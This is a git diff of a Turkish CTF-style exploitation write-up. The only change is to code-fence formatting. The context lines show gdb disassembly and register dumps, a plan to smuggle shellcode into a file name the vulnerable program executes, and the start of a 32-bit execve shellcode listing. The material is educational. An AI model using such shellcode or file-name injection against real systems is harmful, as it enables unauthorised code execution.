@@ -76,7 +76,7 @@ disas main
 
 Çıktı:
 
-```asm
+```
 ...
    0x080484f9 <+84>:	mov    eax,DWORD PTR [ebp-0x8]
    0x080484fc <+87>:	add    eax,0xb
@@ -88,7 +88,7 @@ disas main
 
 Run fonksiyonuna bakalım.
 
-```asm
+```
    0x0804848b <+0>:	push   ebp
    0x0804848c <+1>:	mov    ebp,esp
    0x0804848e <+3>:	sub    esp,0x4
@@ -116,7 +116,7 @@ r `pwd`
 
 İlk breakpoint'ten **run** fonksiyonuna kadar **eax**'in değerlerine bakalım.
 
-```asm
+```
 (gdb) i r eax
 eax            0x804a054	134520916
 (gdb) x/s $eax
@@ -134,7 +134,7 @@ eax            0x804a054	134520916
 
 Görüldüğü üzere öncelikle "sh_"'ın, sonrasında da "sh_"'ın 3 karakter sağının adresi **eax**'e atılıyor. Artık **run** fonksiyonuna verilen parametreyi bildiğimize göre devam edelim.
 
-```asm
+```
 (gdb) x/8wx $esp
 0xffffd590:	0xffffd598	0xffffd5a8	0x0804a062	0x0804a062
 0xffffd5a0:	0x0804a054	0x0804a008	0x00000000	0xf7e2a286
@@ -155,7 +155,7 @@ O zaman biz de bu dosyanın ismine 3. karakterden itibaren **shellcode** koyup *
 
 Çok beğenerek okuduğum "Hacking the art of exploitation" kitabından alıntılayarak shellcode'umuzu anlatacağım.
 
-```asm
+```
 BITS 32
 
 ;execve(const char *filename, char *const argv[], char *const envp[]);
@@ -199,7 +199,7 @@ Yaptığımız şey **0x68732f2f**'nın **0x11111111** eksiğini **eax**'e atıp
 
 Kodun tamamı:
 
-```asm
+```
 BITS 32
 
 xor eax, eax
